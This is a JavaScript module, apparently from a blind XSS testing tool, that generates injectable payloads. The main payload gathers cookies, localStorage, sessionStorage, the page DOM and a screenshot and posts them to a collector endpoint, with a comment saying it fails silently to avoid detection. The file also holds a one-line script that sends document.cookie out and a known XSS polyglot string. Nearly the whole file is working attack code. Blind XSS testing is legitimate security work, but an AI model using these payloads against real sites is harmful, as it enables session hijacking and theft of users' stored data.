/**
 * Payload generation for Blind XSS detection
 * 
 * This module generates JavaScript payloads for Blind XSS detection
 * with various features for data collection and exfiltration.
 */

const config = require('../config');

/**
 * Generate a payload script based on configuration
 * @param {Object} config - Payload configuration
 * @returns {string} Generated payload script
 */
function generatePayloadScript(config = {}) {
  // Merge with default configuration
  const payloadConfig = {
    ...require('../config').payloads.defaultOptions,
    ...config
  };
  
  // Start building the payload
  let script = `
(function() {
  try {
    // Payload data collection
    var data = {};
    
    // Collect URL
    ${payloadConfig.collectUrl ? 'data.url = window.location.href;' : ''}
    
    // Collect IP (will be determined server-side)
    // IP collection happens on the server when the request is received
    
    // Collect User-Agent
    ${payloadConfig.collectUserAgent ? 'data.userAgent = navigator.userAgent;' : ''}
    
    // Collect Referrer
    ${payloadConfig.collectReferer ? 'data.referer = document.referrer;' : ''}
    
    // Collect Origin
    ${payloadConfig.collectOrigin ? 'data.origin = window.location.origin;' : ''}
    
    // Collect Cookies (non-HTTPOnly)
    ${payloadConfig.collectCookies ? `
    data.cookies = {};
    if (document.cookie) {
      var cookies = document.cookie.split(';');
      for (var i = 0; i < cookies.length; i++) {
        var cookie = cookies[i].trim();
        var separatorIndex = cookie.indexOf('=');
        if (separatorIndex > -1) {
          var name = cookie.substring(0, separatorIndex);
          var value = cookie.substring(separatorIndex + 1);
          data.cookies[name] = value;
        }
      }
    }
    ` : ''}
    
    // Collect Local Storage
    ${payloadConfig.collectLocalStorage ? `
    data.localStorage = {};
    for (var i = 0; i < localStorage.length; i++) {
      var key = localStorage.key(i);
      data.localStorage[key] = localStorage.getItem(key);
    }
    ` : ''}
    
    // Collect Session Storage
    ${payloadConfig.collectSessionStorage ? `
    data.sessionStorage = {};
    for (var i = 0; i < sessionStorage.length; i++) {
      var key = sessionStorage.key(i);
      data.sessionStorage[key] = sessionStorage.getItem(key);
    }
    ` : ''}
    
    // Collect DOM
    ${payloadConfig.collectDom ? 'data.dom = document.documentElement.outerHTML;' : ''}
    
    // Take screenshot (simplified)
    ${payloadConfig.takeScreenshot ? `
    try {
      var canvas = document.createElement('canvas');
      var ctx = canvas.getContext('2d');
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
      ctx.drawWindow(window, 0, 0, canvas.width, canvas.height, 'rgb(255,255,255)');
      data.screenshot = canvas.toDataURL('image/jpeg', 0.1);
    } catch (e) {
      // Screenshot failed, continue without it
    }
    ` : ''}
    
    // Send data to collector
    sendData(data);
  } catch (e) {
    // Silent fail to avoid detection
  }
  
  // Data sending function
  function sendData(data) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '${getCollectorUrl()}', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.withCredentials = true;
    xhr.send(JSON.stringify(data));
  }
})();
`;
  
  return script.trim();
}

/**
 * Get the collector URL for this payload
 * @returns {string} Collector URL
 */
function getCollectorUrl() {
  // In a real implementation, this would be dynamically generated
  // based on the deployment environment
  return 'http://localhost:3000/api/reports';
}

/**
 * Generate a simple payload for testing
 * @returns {string} Simple test payload
 */
function generateTestPayload() {
  return `
<script>
  new Image().src = '${getCollectorUrl()}?test=1&cookie=' + escape(document.cookie);
</script>
`;
}

/**
 * Generate a polyglot payload (works in multiple contexts)
 * @returns {string} Polyglot payload
 */
function generatePolyglotPayload() {
  // This is a simplified example - real polyglot payloads are much more complex
  return `
jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e
`;
}

module.exports = {
  generatePayloadScript,
  generateTestPayload,
  generatePolyglotPayload
};